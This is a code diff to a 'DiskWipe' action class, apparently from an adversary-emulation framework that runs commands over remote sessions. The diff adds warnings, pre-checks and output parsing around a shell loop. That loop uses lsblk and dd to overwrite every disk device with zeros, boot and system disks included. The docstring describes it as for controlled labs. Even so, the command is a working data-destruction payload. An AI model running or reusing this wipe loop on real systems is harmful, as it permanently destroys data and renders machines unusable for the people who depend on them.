@@ -161,7 +161,25 @@ class DiskWipe(Action):
         - For each device of type "disk", overwrite with zeros via dd
         - Best-effort: failures on individual devices do not stop the loop
 
-        This is highly destructive and intended only for lab usage.
+        WARNING: This action will wipe ALL disk devices found on the system, including:
+        - Boot disks
+        - System disks
+        - All data storage devices
+        - No devices are excluded or protected
+
+        This operation is EXTREMELY DESTRUCTIVE and will render the system completely
+        unusable. All data on all disk devices will be permanently destroyed.
+        This action is intended ONLY for controlled lab environments where complete
+        system destruction is acceptable.
+
+        Performance Notes:
+        - Uses dd with 4MB block size and fdatasync for data synchronization
+        - Expected duration: approximately 1-2 hours per 100GB of disk capacity
+        - For a 1TB disk, expect 10-20 hours of execution time
+        - The conv=fdatasync flag ensures data is actually written to disk but
+          significantly slows down the operation
+        - This action may take hours or days to complete on systems with large disks
+        - The session must remain active for the entire duration
         """
         tulpa_session = pattern.get("session")
         tulpa_session_id = tulpa_session.get("id")
@@ -175,20 +193,75 @@ class DiskWipe(Action):
                 session=tulpa_session_id,
             )
 
-        # Enumerate and wipe all block devices of type "disk"
-        # Note: this intentionally does not try to be smart about excluding boot disks.
+        # Enumerate and wipe ALL block devices of type "disk"
+        # WARNING: This will wipe ALL disks including boot/system disks - no devices are excluded.
+        # Check if lsblk is available and can enumerate devices
+        # First check if lsblk exists, then try to list devices
+        check_cmd = "which lsblk >/dev/null 2>&1 && lsblk -ndo NAME,TYPE 2>&1 | awk '$2==\"disk\" {print $1}'"
+        check_output = live_session.run_command(check_cmd)
+        
+        # Check for lsblk command failures
+        # If which fails, check_output will be empty due to && short-circuit
+        # Also check for error messages in stderr that might have been captured
+        if not check_output.strip():
+            return ActionExecutionResult(
+                command=[check_cmd],
+                stdout="lsblk command not available or failed to execute",
+                exit_status=1,
+                session=tulpa_session_id,
+            )
+        
+        # Check for error messages that might appear in output
+        error_indicators = ["error", "permission denied", "cannot", "failed"]
+        if any(indicator in check_output.lower() for indicator in error_indicators):
+            return ActionExecutionResult(
+                command=[check_cmd],
+                stdout=check_output,
+                exit_status=1,
+                session=tulpa_session_id,
+            )
+        
+        # If no devices found, still proceed but note it in output
+        devices_found = [line.strip() for line in check_output.strip().split('\n') if line.strip()]
+        
+        if not devices_found:
+            return ActionExecutionResult(
+                command=[check_cmd],
+                stdout="No disk devices found to wipe",
+                exit_status=0,  # Not an error, just no devices
+                session=tulpa_session_id,
+            )
+        
+        # Proceed with wiping devices
+        # Using bs=4M (4MB blocks) for better performance than 1M
+        # conv=fdatasync ensures data is written to disk but significantly slows operation
+        # Expected: ~1-2 hours per 100GB, so a 1TB disk may take 10-20 hours
         cmd = (
-            "for dev in $(lsblk -ndo NAME,TYPE | awk '$2==\"disk\" {print $1}'); do "
+            f"for dev in $(lsblk -ndo NAME,TYPE 2>/dev/null | awk '$2==\"disk\" {{print $1}}'); do "
             f"echo \"{DiskWipe.WIPING_PREFIX}$dev\"; "
-            f"dd if=/dev/zero of={DiskWipe.DEVICE_PREFIX}$dev bs=1M status=none conv=fdatasync || true; "
+            f"dd if=/dev/zero of={DiskWipe.DEVICE_PREFIX}$dev bs=4M status=none conv=fdatasync 2>/dev/null || true; "
             "done; "
             f"echo '{DiskWipe.COMPLETION_MESSAGE}'"
         )
 
         stdout = live_session.run_command(cmd)
 
-        # If the wipe loop ran at all, treat as success; callers can inspect stdout
-        exit_status = 0
+        # Determine exit_status based on command execution results
+        # Check for fundamental failures first
+        if not stdout or not stdout.strip():
+            # Empty output indicates command failed to execute or session issue
+            exit_status = 1
+        elif DiskWipe.COMPLETION_MESSAGE not in stdout:
+            # Completion message missing indicates the loop didn't finish
+            # This could mean lsblk failed, command syntax error, or session died
+            exit_status = 1
+        elif DiskWipe.WIPING_PREFIX not in stdout:
+            # Completion message present but no devices were processed
+            # This means the loop ran but found no devices (shouldn't happen if check passed)
+            exit_status = 1
+        else:
+            # Success: completion message present and at least one device was processed
+            exit_status = 0
 
         return ActionExecutionResult(
             command=[cmd],
@@ -200,6 +273,8 @@ class DiskWipe(Action):
     def parse_output(self, output: ActionExecutionResult) -> dict:
         """
         Parse the output to extract which devices were wiped.
+        
+        Uses robust parsing to handle device names that may contain special characters.
         """
         wiped_devices = []
         ran = False
@@ -208,10 +283,28 @@ class DiskWipe(Action):
             for line in output.stdout.split("\n"):
                 line = line.strip()
                 if line.startswith(DiskWipe.WIPING_PREFIX):
-                    # Extract device name (e.g., "sda" from "Wiping /dev/sda")
-                    device = line.replace(DiskWipe.WIPING_PREFIX, "").strip()
-                    if device:
-                        wiped_devices.append(device)
+                    # Extract device name using split for more robust parsing
+                    # Format: "Wiping /dev/sda" -> extract "sda"
+                    # Split on the prefix and take the part after it
+                    parts = line.split(DiskWipe.WIPING_PREFIX, 1)
+                    if len(parts) > 1:
+                        device_part = parts[1].strip()
+                        # Device should be in format /dev/NAME or just NAME
+                        # Remove /dev/ prefix if present to get just the device name
+                        if device_part.startswith(DiskWipe.DEVICE_PREFIX):
+                            device = device_part[len(DiskWipe.DEVICE_PREFIX):].strip()
+                        else:
+                            device = device_part
+                        
+                        # Validate device name: should be non-empty and not contain newlines
+                        # Device names are typically alphanumeric with possible dashes/underscores
+                        # Additional validation: ensure it doesn't contain unexpected characters
+                        if device and '\n' not in device:
+                            # Further validate: device name should not be empty after stripping
+                            # and should be a reasonable length (device names are usually short)
+                            device_clean = device.strip()
+                            if device_clean and len(device_clean) <= 255:  # Reasonable max length
+                                wiped_devices.append(device_clean)
                 elif DiskWipe.COMPLETION_MESSAGE in line:
                     ran = True
         
